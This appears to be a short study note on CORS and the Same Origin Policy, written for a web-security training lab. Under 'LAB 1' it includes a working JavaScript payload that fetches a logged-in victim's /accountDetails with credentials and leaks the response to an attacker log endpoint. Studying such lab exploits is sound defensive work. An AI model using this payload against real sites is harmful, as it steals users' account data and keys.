# CORS - Cross Origin Resource Sharing

CORS - protocol and header

CORS (Cross-Origin Resource Sharing) is an HTTP-header based security mechanism that allows a server to permit a web page from one origin
(domain, protocol, or port) to access resources from a different origin.

## SOP - Same Origin Policy

same origin policy limits a website to access contents or files outside its particular domain.

CORS is used to relax the SOP in a controlled manner, so websites can able to access resources outside its domain but without causing any issues.


### LAB 1

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ad5006c03c5512b817d98b6002100b8.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

